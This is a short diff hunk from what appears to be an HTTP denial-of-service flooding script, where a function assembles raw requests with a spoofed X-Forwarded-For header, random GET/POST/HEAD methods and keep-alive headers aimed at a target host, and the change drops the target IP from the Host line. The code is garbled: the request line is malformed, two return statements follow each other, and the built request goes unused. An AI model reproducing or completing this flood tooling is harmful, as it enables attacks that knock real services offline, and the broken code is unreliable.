@@ -398,7 +398,7 @@ def start2():
   connection += "X-Forwarded-For: " + spoofer1() + "\r\n"
   connect = "Connection : keep-Alive\r\n\r\n"
   get_rand = random.choice(['GET','POST',"HEAD"])
-  get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
+  get_host = "GET /Attacked-RR/1.1\r\nHost: "  + "\r\n"
   request = get_host + acceptref + agents + connect + connection + get_rand + "\r\n"
   return byte1
   return byte2
